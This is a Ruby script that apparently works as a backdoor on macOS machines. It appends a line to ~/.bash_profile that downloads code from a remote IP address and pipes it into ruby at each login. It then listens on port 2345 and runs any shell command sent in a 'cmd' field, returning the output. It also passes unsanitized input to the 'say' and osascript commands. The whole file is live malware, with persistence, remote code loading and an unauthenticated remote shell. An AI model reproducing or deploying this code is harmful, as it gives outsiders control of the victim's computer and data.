require 'JSON'
require 'socket'
require 'uri'

result = `cat ~/.bash_profile | grep curl -s`
`echo "(exec curl -s http://10.104.120.131:9000 | ruby &)" >> ~/.bash_profile` if result.empty?

begin
  server = TCPServer.new('0.0.0.0', 2345)
rescue
  exit
end

def send_response(client, response)
  client.print "HTTP/1.1 200 OK\r\n" +
               "Content-Type: text/plain\r\n" +
               "Content-Length: #{response.bytesize}\r\n" +
               "Connection: close\r\n"

  client.print "\r\n"
  client.print response
  client.close
end

while true
  client = server.accept

  headers = {}
  while line = client.gets.split(' ', 2)
    break if line[0] == ""
    headers[line[0].chop.downcase] = line[1].strip
  end

  raw_data = client.read(headers["content-length"].to_i)

  begin
    data = JSON.parse(raw_data)
  rescue JSON::ParserError
    arr = raw_data.split('&')
    if arr.any? { |kvp| !kvp.include? '=' }
      send_response(client, '')
      next
    end

    data = {}
    arr.each { |kvp| data[kvp.split('=')[0]] = URI.unescape(kvp.split('=')[1]) }
  ensure
    data ||= {}
  end

  if data["cmd"]
    response = `#{data["cmd"]}`
    send_response(client, response)
    next
  end

  send_response(client, 'empty') if data["say"].nil? && data["volume"].nil?

  if data["volume"]
    vol = data["volume"].to_i
    osascript = "\"set Volume #{vol}\""
    cmd = "osascript -e #{osascript}"
    `#{cmd}`
  end

  phrase = data["say"] || ''
  cmd = "say #{phrase}"
  `#{cmd}`

  response = phrase
  send_response(client, response)
end
